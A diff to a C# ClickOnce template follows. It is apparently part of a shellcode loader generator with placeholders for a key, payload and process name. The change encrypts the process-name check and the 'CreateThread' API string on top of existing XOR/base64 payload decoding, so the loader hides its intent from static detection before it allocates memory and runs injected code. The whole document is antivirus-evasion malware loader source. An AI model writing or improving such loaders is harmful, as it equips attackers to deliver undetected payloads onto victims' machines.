@@ -42,16 +42,22 @@ namespace ClickOnceTemplate
 
         static IntPtr VAR8()
         {
-            if (Process.GetProcessesByName("[PROCESS_NAME]").Length > 0)
+			byte[] VAR9 = {[KEY]};
+			byte[] VAR100 = Convert.FromBase64String("[PROCESS_NAME]");
+			byte[] VAR101 = VAR16.VAR28(VAR9, VAR100);
+			byte[] VAR102 = Convert.FromBase64String("[CREATE_THREAD]");
+			byte[] VAR103 = VAR16.VAR28(VAR9, VAR102);
+			
+            if (Process.GetProcessesByName(Encoding.ASCII.GetString(VAR101)).Length > 0)
             {				
-				byte[] VAR9 = {[KEY]};
+				
 				byte[] VAR10 = Convert.FromBase64String("[PAYLOAD]");
 				Array.Reverse(VAR10, 0, VAR10.Length);
 				VAR10 = Convert.FromBase64String(Encoding.ASCII.GetString(VAR10));
 				
 				byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);
 				IntPtr VAR33 = LoadLibrary("kernel32.dll");
-				IntPtr VAR34 = GetProcAddress(VAR33, "CreateThread");
+				IntPtr VAR34 = GetProcAddress(VAR33, Encoding.ASCII.GetString(VAR103));
 				VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));
 
 				UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
